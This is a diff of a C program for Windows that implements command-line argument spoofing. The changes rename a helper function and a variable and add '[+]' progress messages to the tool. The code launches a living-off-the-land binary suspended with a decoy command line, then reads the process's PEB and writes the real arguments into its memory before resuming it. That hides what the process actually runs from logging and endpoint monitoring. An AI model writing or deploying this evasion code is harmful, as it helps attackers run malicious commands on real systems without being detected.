@@ -3,7 +3,7 @@
 #include <windows.h>
 #include <winternl.h>
 
-void replaceAfterFirstSpace(const char *original, char *modified) {
+void replaceArguementsWithSpaces(const char *original, char *modified) {
     const char *firstSpace = strchr(original, ' ');
     if (firstSpace != NULL) {
         size_t length = firstSpace - original + 1;
@@ -20,17 +20,15 @@ int main() {
 
     // Create spoofed cmdline
     char spoofedCmdline[MAX_PATH];
-    replaceAfterFirstSpace(lolBinCommand, spoofedCmdline);
+    replaceArguementsWithSpaces(lolBinCommand, spoofedCmdline);
 
     // Convert realCmdline to wide character string
     int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, NULL, 0);
     wchar_t *realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
     MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);
 
-    printf("%s\n", spoofedCmdline);
-    wprintf(L"%ls\n", realCmdlineW);
-
     // Create suspended process
+    printf("[+] Creating the process suspended\n");
     STARTUPINFOEX si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
@@ -38,30 +36,33 @@ int main() {
         return FALSE;
     }
 
-    // Get remote PEB address
-    PROCESS_BASIC_INFORMATION bi;
+    // Get PROCESS_BASIC_INFORMATION structure
+    printf("[+] Reading the PROCESS_BASIC_INFORMATION structure\n");
+    PROCESS_BASIC_INFORMATION pbi;
     ULONG ret;
-    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &bi, sizeof(bi), &ret) != 0) {
+    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
         free(realCmdlineW);
         return FALSE;
     }
-    printf("PEB Base Address: %p\n", bi.PebBaseAddress);
+    printf("PEB Base Address: %p\n", pbi.PebBaseAddress);
 
     // Get PEB structure
+    printf("[+] Reading the PEB structure\n");
     PEB peb;
-    if (!ReadProcessMemory(pi.hProcess, (PBYTE)bi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
         free(realCmdlineW);
         return FALSE;
     }
-    printf("Process Parameters Address: %p\n", peb.ProcessParameters);
+    printf("Process parameters address: %p\n", peb.ProcessParameters);
 
-    // Get CommandLine member address
+    // Get RTL_USER_PROCESS_PARAMETERS structure
+    printf("[+] Reading the RTL_USER_PROCESS_PARAMETERS structure\n");
     RTL_USER_PROCESS_PARAMETERS procParams;
     if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
         free(realCmdlineW);
         return FALSE;
     }
-    printf("Command Line Address: %p\n", procParams.CommandLine.Buffer);
+    printf("[+] Command line address: %p\n", procParams.CommandLine.Buffer);
 
     // Change command line
     if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
@@ -70,6 +71,7 @@ int main() {
     }
 
     // Resume process
+    printf("[+] Resuming the main thread\n");
     ResumeThread(pi.hThread);
     
     free(realCmdlineW);
